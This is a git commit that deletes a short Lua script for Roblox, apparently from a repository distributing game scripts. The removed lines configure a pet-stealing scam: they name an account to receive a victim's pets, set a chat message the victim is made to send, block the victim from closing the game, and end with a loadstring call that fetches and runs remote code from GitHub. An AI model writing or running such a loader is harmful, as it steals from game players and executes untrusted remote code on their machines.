ecee176584e2c2868d61d36078f9358b0c5ed66e
SCRIPTINGCOMMUNITY <137361755+SCRIPTINGCOMMUNITY@users.noreply.github.com>
2023-06-23 18:51:11 +0500

    Delete 09QNiA_1687461478.lua

--- 09QNiA_1687461478.lua
+++
@@ -1,8 +0,0 @@
-
-_G.Username = "Penismak" --// Username To Send Pets To
-_G.GiftMessage = "Sussy" --// Message For The Gift To Say
-_G.SendMessage = "Shrek" --// Message the victim will send in the chat on execution
-_G.Diamonds = 1 --// Amount Of Diamonds To detect alt set an amount of diamond that if the target is under this number, the script will show them an error
-_G.UnlockPets = true --// Unlocks Locked Pets
-_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SCRIPTINGCOMMUNITY/SCRIPTS/09QNiA_1687461478.lua"))()
